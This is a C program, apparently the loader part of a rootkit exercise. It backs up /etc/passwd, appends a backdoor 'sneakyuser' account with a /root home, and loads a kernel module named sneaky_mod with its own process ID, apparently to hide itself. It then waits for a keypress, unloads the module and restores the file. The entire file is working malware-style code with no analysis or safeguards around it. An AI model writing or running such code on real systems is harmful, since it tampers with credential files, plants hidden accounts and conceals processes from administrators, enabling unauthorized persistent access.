#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

int main() {
  system("cp /etc/passwd /tmp/passwd");
  FILE *f = fopen("/etc/passwd", "a");
  if(f == NULL) {
    perror("fopen:");
  }
  fprintf(f, "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  fclose(f);
  
  pid_t mypid = getpid();
  printf("sneaky_process pid = %d\n", mypid);
  char command[50] = "insmod sneaky_mod.ko mypid=";
  char cpid[10];
  sprintf(cpid, "\"%d\"", mypid);
  strcat(command, cpid);
  system(command);
  while(1) {
    char c = getchar();
    if(c == 'q') {
      break;
    }
  }
  system("rmmod sneaky_mod");
  system("cp /tmp/passwd /etc/passwd");
  return 0;
}
